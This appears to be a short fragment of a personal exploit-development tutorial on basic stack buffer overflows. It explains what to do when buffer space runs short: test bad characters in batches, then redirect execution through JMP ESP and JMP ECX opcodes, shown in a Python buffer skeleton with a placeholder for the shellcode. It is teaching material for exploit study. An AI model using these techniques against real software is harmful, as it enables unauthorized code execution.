# Sometimes ...

## Table of Contents

* 1.0 [Not enough space to test bad characters.](#NES-BC)
* 2.0 [Not enough spcae to test shellcode.](#NES-Shellcode)
#### 10.1 Not enough space to test bad characters.<a name="NES-BC"></a>

Sometime, if you didn't have enough size to test all the bad characters in one shot.
 
To overcome this, you can comment all the badchars line, and send the maximum badchars size possible at a time.


#### 10.2 Not enough space for the shellcode.<a name="NES-Shellcode"></a>

If you cant find enought space for the shellcode, once you get the JMP ESP instruction, check if any others registers redirect to our buffer (it can be the "A" buffer too).
 
Then if you find it (example ECX), find the JMP ECX opcodes.
 
```bash
┌──(v0lk3n㉿Laptop)-[~/StackOverflow-Basic]
└─$ msf-nasm_shell
nasm > JMP ECX
00000000  FFE1              jmp ecx
```

Complete the address with NOPs instructions to redirect the flow to it.
 
```python
...
size = 2600
shell = <shellcode here>

buffer = b"\x90" * (size - len(shell))
eip = b"\xcf\x60\x40\x12" # 124060cf JMP ESP 
ecx = b"\xff\xe1\x90\x90" # 0xffe1 JMP ECX NOP NOP
nops = b"\x90" * 10
...
```